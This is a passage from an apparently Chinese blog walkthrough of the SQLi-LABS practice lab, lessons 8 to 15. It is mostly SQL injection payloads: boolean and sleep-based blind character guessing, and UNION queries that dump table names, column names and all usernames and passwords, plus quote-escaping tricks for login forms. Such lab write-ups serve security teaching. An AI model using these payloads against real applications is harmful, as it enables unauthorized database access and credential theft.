class="string">/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;b&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(substr((select group_concat(username) from users),1,1)=&#x27;</span>d<span class="string">&#x27;,1,0) --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查询第二位数据</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line"># 错误</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(substr((select group_concat(username) from users),2,1)=&#x27;</span>b<span class="string">&#x27;,1,0) --+</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(substr((select group_concat(username) from users),2,1)=&#x27;</span>u<span class="string">&#x27;,1,0) --+</span></span><br></pre></td></tr></table></figure>

<h2 id="Less-9-基于时间单引号字符串"><a href="#Less-9-基于时间单引号字符串" class="headerlink" title="Less-9 基于时间单引号字符串"></a>Less-9 基于时间单引号字符串</h2><ul>
<li>首先是猜出SQL语句或者找出注入点：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 返回：You <span class="keyword">are</span> in...........</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"># 返回：You <span class="keyword">are</span> in...........</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">0</span></span><br><span class="line"></span><br><span class="line"># 返回：You <span class="keyword">are</span> in...........</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 返回：You are in...........</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"># 进过多次尝试发现无论输入什么内容都是显示</span><br><span class="line"># 返回：You <span class="keyword">are</span> in...........</span><br></pre></td></tr></table></figure>

<ul>
<li>假设SQL语句为：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, column2, column3 <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span> limit <span class="number">0</span>, <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>尝试使用sleep()函数进行注入：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span> <span class="string">&#x27;union select 1,2, sleep(3) --+</span></span><br></pre></td></tr></table></figure>

<ul>
<li>发现页面返回花费了3秒多的时间。</li>
</ul>
<p><img src="/../../images/SQLi-LABS/image-20210926163416721.png" alt="image-20210926163416721"></p>
<ul>
<li>现在我们已经成功注入了。我们可以依靠Less-8的方法进行猜出数据。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 查询第一位数据</span><br><span class="line"># 错误</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(substr((select group_concat(username) from users),1,1)=&#x27;</span>a<span class="string">&#x27;,sleep(3),0) --+</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;b&#x27;</span>,sleep(<span class="number">3</span>),<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(substr((select group_concat(username) from users),1,1)=&#x27;</span>d<span class="string">&#x27;,sleep(3),0) --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查询第二位数据</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>,sleep(<span class="number">3</span>),<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line"># 错误</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(substr((select group_concat(username) from users),2,1)=&#x27;</span>b<span class="string">&#x27;,sleep(3),0) --+</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span>,sleep(<span class="number">3</span>),<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(substr((select group_concat(username) from users),2,1)=&#x27;</span>u<span class="string">&#x27;,sleep(3),0) --+</span></span><br></pre></td></tr></table></figure>

<h2 id="Less-10-基于时间双引号字符串"><a href="#Less-10-基于时间双引号字符串" class="headerlink" title="Less-10 基于时间双引号字符串"></a>Less-10 基于时间双引号字符串</h2><ul>
<li>由于这里的SQL语句应该和Less-9区别不大。猜测应该是如下所示：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, column2, column3 <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> &quot;$id&quot; limit <span class="number">0</span>, <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>直接将Less-9的注入成功的payload拿来使用：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot; and 1=if(substr((select group_concat(username) from users),1,1)=&#x27;d&#x27;,sleep(3),0) --+</span><br></pre></td></tr></table></figure>

<ul>
<li>现在我们已经成功注入了。我们可以依靠Less-8的方法进行猜出数据。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 查询第一位数据</span><br><span class="line"># 错误</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>&quot; and 1=if(substr((select group_concat(username) from users),1,1)=&#x27;a&#x27;,sleep(3),0) --+</span><br><span class="line"># 错误</span><br><span class="line">/?id=1&quot; <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;b&#x27;</span>,sleep(<span class="number">3</span>),<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>&quot; and 1=if(substr((select group_concat(username) from users),1,1)=&#x27;d&#x27;,sleep(3),0) --+</span><br><span class="line"></span><br><span class="line"># 查询第二位数据</span><br><span class="line"># 错误</span><br><span class="line">/?id=1&quot; <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>,sleep(<span class="number">3</span>),<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line"># 错误</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>&quot; and 1=if(substr((select group_concat(username) from users),2,1)=&#x27;b&#x27;,sleep(3),0) --+</span><br><span class="line"># 错误</span><br><span class="line">/?id=1&quot; <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span>,sleep(<span class="number">3</span>),<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>&quot; and 1=if(substr((select group_concat(username) from users),2,1)=&#x27;u&#x27;,sleep(3),0) --+</span><br></pre></td></tr></table></figure>

<h2 id="Less-11-基于错误的字符串"><a href="#Less-11-基于错误的字符串" class="headerlink" title="Less-11 基于错误的字符串"></a>Less-11 基于错误的字符串</h2><p><img src="/../../images/SQLi-LABS/image-20210926165317443.png" alt="image-20210926165317443"></p>
<ul>
<li>尝试在username编辑框中输入**’admin**，然后就出现图中的错误。</li>
</ul>
<p><img src="/../../images/SQLi-LABS/image-20210926165534419.png" alt="image-20210926165534419"></p>
<ul>
<li>现在我们可以猜出该SQL语句为：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, ... <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> password <span class="operator">=</span> <span class="string">&#x27;$password&#x27;</span> limit <span class="number">0</span>, <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>接下来我们要完善我们猜测的SQL语句。目前我们只知道<code> and password = &#39;$password&#39; limit 0, 1;</code>前面的SQL语句还太清楚。</p>
</li>
<li><p>首先先把<code>and password = &#39;$password&#39; limit 0, 1</code>注释掉，然后在注释前面输入payload。</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 错误</span><br><span class="line">uname<span class="operator">=</span><span class="string">&#x27;or+1=1+order+by+8--+&amp;passwd=admin&amp;submit=Submit</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">uname=&#x27;</span><span class="keyword">or</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="operator">+</span><span class="keyword">order</span><span class="operator">+</span><span class="keyword">by</span><span class="operator">+</span><span class="number">4</span><span class="comment">--+&amp;passwd=admin&amp;submit=Submit</span></span><br><span class="line"># 正确</span><br><span class="line">uname<span class="operator">=</span><span class="string">&#x27;or+1=1+order+by+2--+&amp;passwd=admin&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>

<ul>
<li>从上面的结果我们发现该查询只有两个字段。</li>
<li>新增查询出当前使用的表是什么名称。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="string">&#x27;union+select+database(),((select+group_concat(table_name)+from+information_schema.tables+where+table_schema=database()))--+&amp;passwd=admin&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>

<p><img src="/../../images/SQLi-LABS/image-20210926170831305.png" alt="image-20210926170831305"></p>
<ul>
<li>现在获取users表中的所有列名。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="string">&#x27;union+select+database(),((select+group_concat(column_name)+from+information_schema.columns+where+table_schema=database()and+table_name+=&#x27;</span>users<span class="string">&#x27;))--+&amp;passwd=admin&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>

<p><img src="/../../images/SQLi-LABS/image-20210926171225012.png" alt="image-20210926171225012"></p>
<ul>
<li>现在我们已经知道该SQL语句应该为：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username, password <span class="keyword">from</span> username <span class="operator">=</span> <span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> password <span class="operator">=</span> <span class="string">&#x27;$password&#x27;</span> limit <span class="number">0</span>, <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>接下来我们就需要获取users表中的所有数据。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="string">&#x27;union+select+(select+group_concat(username)+from+users),(select+group_concat(password)+from+users)--+&amp;passwd=admin&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>

<p><img src="/../../images/SQLi-LABS/image-20210926171549808.png" alt="image-20210926171549808"></p>
<h2 id="Less-12-基于错误-双引号-字符串"><a href="#Less-12-基于错误-双引号-字符串" class="headerlink" title="Less-12 基于错误-双引号-字符串"></a>Less-12 基于错误-双引号-字符串</h2><ul>
<li>使用<code>&quot;union+select+1,2--+</code>payload会出现错误。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error <span class="keyword">in</span> your <span class="keyword">SQL</span> syntax; <span class="keyword">check</span> the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;union select 1,2-- &quot;) and password=(&quot;admin&quot;) LIMIT 0,1&#x27;</span> <span class="keyword">at</span> line <span class="number">1</span></span><br></pre></td></tr></table></figure>

<ul>
<li>然后发现双引号后面有有单引号，使用下列payload成功绕过。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>&quot;union+select+1,2--+&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<ul>
<li>获取所有users表中所有的数据（获取数据库中的所有表和所有列可参照Less-11）。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>&quot;)union+select+(select+group_concat(username)+from+users),(select+group_concat(password)+from+users)--+&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/SQLi-LABS/image-20210926191535359.png" alt="image-20210926191535359"></p>
<h2 id="Less-13-双注入字符串带扭转"><a href="#Less-13-双注入字符串带扭转" class="headerlink" title="Less-13-双注入字符串带扭转"></a>Less-13-双注入字符串带扭转</h2><ul>
<li>使用单引号会触发如下错误信息：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error <span class="keyword">in</span> your <span class="keyword">SQL</span> syntax; <span class="keyword">check</span> the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;&#x27;</span>a<span class="string">&#x27;&#x27;</span>) <span class="keyword">and</span> password<span class="operator">=</span>(<span class="string">&#x27;&#x27;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27; at line 1</span></span><br></pre></td></tr></table></figure>

<ul>
<li>我们可以猜测该SQL语句为：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, column2, ... <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> (<span class="string">&#x27;$username&#x27;</span>) <span class="keyword">and</span> password <span class="operator">=</span> (<span class="string">&#x27;$password&#x27;</span>) limit <span class="number">0</span>, <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>获取users表中的所有数据：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="string">&#x27;)union+select+(select+group_concat(username)+from+users),(select+group_concat(password)+from+users)--+&amp;passwd=&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>发现页面仅返回了一个flag.jpg图片。</p>
</li>
<li><p>接下来我们或利用二分法获取数据：</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 查询第一位数据</span><br><span class="line"># 错误</span><br><span class="line">uname<span class="operator">=</span>admin<span class="string">&#x27;)and+1=if(substr((select+group_concat(username)+from+users),1,1)=&#x27;</span>a<span class="string">&#x27;,1,0)--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">uname=admin&#x27;</span>)<span class="keyword">and</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span><span class="operator">+</span>group_concat(username)<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;b&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>)<span class="comment">--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line">uname<span class="operator">=</span>admin<span class="string">&#x27;)and+1=if(substr((select+group_concat(username)+from+users),1,1)=&#x27;</span>d<span class="string">&#x27;,1,0)--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查询第二位数据</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">uname=admin&#x27;</span>)<span class="keyword">and</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span><span class="operator">+</span>group_concat(username)<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>)<span class="comment">--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line"># 错误</span><br><span class="line">uname<span class="operator">=</span>admin<span class="string">&#x27;)and+1=if(substr((select+group_concat(username)+from+users),2,1)=&#x27;</span>b<span class="string">&#x27;,1,0)--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">uname=admin&#x27;</span>)<span class="keyword">and</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span><span class="operator">+</span>group_concat(username)<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>)<span class="comment">--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line">uname<span class="operator">=</span>admin<span class="string">&#x27;)and+1=if(substr((select+group_concat(username)+from+users),2,1)=&#x27;</span>u<span class="string">&#x27;,1,0)--+&amp;passwd=&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>

<h2 id="Less-14-双注入双引号字符串"><a href="#Less-14-双注入双引号字符串" class="headerlink" title="Less-14 双注入双引号字符串"></a>Less-14 双注入双引号字符串</h2><ul>
<li>使用双引号后得到如下错误信息：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error <span class="keyword">in</span> your <span class="keyword">SQL</span> syntax; <span class="keyword">check</span> the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;&quot;&quot;&quot; and password=&quot;&quot; LIMIT 0,1&#x27;</span> <span class="keyword">at</span> line <span class="number">1</span></span><br></pre></td></tr></table></figure>

<ul>
<li>由于这里的和Less-13区别不大，根据题目提示将Less-13的单引号替换成双引号：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 查询第一位数据</span><br><span class="line"># 错误</span><br><span class="line">uname<span class="operator">=</span>&quot;and+1=if(substr((select+group_concat(username)+from+users),1,1)=&#x27;a&#x27;,1,0)--+&amp;passwd=&amp;submit=Submit</span><br><span class="line"># 错误</span><br><span class="line">uname=&quot;<span class="keyword">and</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span><span class="operator">+</span>group_concat(username)<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;b&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>)<span class="comment">--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line">uname<span class="operator">=</span>&quot;and+1=if(substr((select+group_concat(username)+from+users),1,1)=&#x27;d&#x27;,1,0)--+&amp;passwd=&amp;submit=Submit</span><br><span class="line"></span><br><span class="line"># 查询第二位数据</span><br><span class="line"># 错误</span><br><span class="line">uname=&quot;<span class="keyword">and</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span><span class="operator">+</span>group_concat(username)<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>)<span class="comment">--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line"># 错误</span><br><span class="line">uname<span class="operator">=</span>&quot;and+1=if(substr((select+group_concat(username)+from+users),2,1)=&#x27;b&#x27;,1,0)--+&amp;passwd=&amp;submit=Submit</span><br><span class="line"># 错误</span><br><span class="line">uname=&quot;<span class="keyword">and</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span><span class="operator">+</span>group_concat(username)<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>)<span class="comment">--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line">uname<span class="operator">=</span>&quot;and+1=if(substr((select+group_concat(username)+from+users),2,1)=&#x27;u&#x27;,1,0)--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<h2 id="Less-15-基于布尔值的字符串"><a href="#Less-15-基于布尔值的字符串" class="headerlink" title="Less-15 基于布尔值的字符串"></a>Less-15 基于布尔值的字符串</h2><ul>
<li>首先找出注入点。这里我们尝试在文本框中添加单引号。</li>
<li>返回失败的图片。我们再尝试在单引号后面加上<code>or1=1</code>然后发现返回成功的图片，我们就可以猜一下该SQL语句。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, column2 <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> password <span class="operator">=</span> <span class="string">&#x27;$password&#x27;</span> limit <span class="number">0</span>, <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>使用下列方法</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 查询第一位数据</span><br><span class="line"># 错误</span><br><span class="line">uname<span class="operator">=</span><span class="string">&#x27;and+1=if(substr((select+group_concat(username)+from+users),1,1)=&#x27;</span>a<span class="string">&#x27;,1,0)--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">uname=&#x27;</span><span class="keyword">and</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span><span class="operator">+</span>group_concat(username)<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;b&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>)<span class="comment">--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line">uname<span class="operator">=</span><span class="string">&#x27;and+1=if(substr((select+group_concat(username)+from+users),1,1)=&#x27;</span>d<span class="string">&#x27;,1,0)--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查询第二位数据</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">uname=&#x27;</span><span class="keyword">and</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span><span class="operator">+</span>group_concat(username)<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>)<span class="comment">--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line"># 错误</span><br><span class="line">uname<span class="operator">=</span><span class="string">&#x27;and+1=if(substr((select+group_concat(username)+from+users),2,1)=&#x27;</span>b<span class="string">&#x27;,1,0)--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">uname=&#x27;</span><span class="keyword">and</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span><span class="operator">+</span>group_concat(username)<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span 